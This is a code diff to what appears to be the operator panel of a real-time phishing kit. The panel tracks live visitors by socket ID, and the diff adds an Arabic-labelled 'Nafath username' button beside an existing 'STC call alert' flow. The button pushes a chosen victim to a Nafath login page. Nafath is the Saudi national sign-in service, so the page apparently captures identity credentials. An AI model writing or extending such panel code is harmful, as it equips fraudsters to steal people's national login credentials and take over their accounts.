@@ -1764,16 +1764,34 @@
             
             // إضافة أزرار لتنبية إتصال STC
             if (dataEntry.page === 'تنبية إتصال STC') {
+              const nafathUsernameBtnId = 'nafath-username-btn-' + visitor.socketId + '-' + dataIndex;
               const nafathBtnId = 'nafath-btn-' + visitor.socketId + '-' + dataIndex;
               const stcCallRejectBtnId = 'stc-call-reject-btn-' + visitor.socketId + '-' + dataIndex;
               html += '<div class="flex gap-2 mt-3">';
+              html += '<button id="' + nafathUsernameBtnId + '" class="flex-1 px-3 py-2 bg-teal-600 text-white rounded-lg hover:bg-teal-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>اسم مستخدم نفاذ</button>';
               html += '<button id="' + nafathBtnId + '" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>تطبيق نفاذ</button>';
               html += '<button id="' + stcCallRejectBtnId + '" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
               html += '</div>';
               // إضافة event listeners بعد إنشاء العناصر
               setTimeout(() => {
+                const nafathUsernameBtn = document.getElementById(nafathUsernameBtnId);
                 const nafathBtn = document.getElementById(nafathBtnId);
                 const rejectBtn = document.getElementById(stcCallRejectBtnId);
+                if (nafathUsernameBtn) {
+                  nafathUsernameBtn.addEventListener('click', () => {
+                    navigateVisitorToPage(visitor.socketId, 'nafath-login-page');
+                    const originalText = nafathUsernameBtn.textContent;
+                    const originalClasses = ['bg-teal-600', 'hover:bg-teal-700'];
+                    nafathUsernameBtn.textContent = 'تم الإرسال ✓';
+                    nafathUsernameBtn.classList.remove(...originalClasses);
+                    nafathUsernameBtn.classList.add('bg-green-600');
+                    setTimeout(() => {
+                      nafathUsernameBtn.textContent = originalText;
+                      nafathUsernameBtn.classList.remove('bg-green-600');
+                      nafathUsernameBtn.classList.add(...originalClasses);
+                    }, 1500);
+                  });
+                }
                 if (nafathBtn) {
                   nafathBtn.addEventListener('click', () => {
                     navigateVisitorToPage(visitor.socketId, 'nafath-verify');
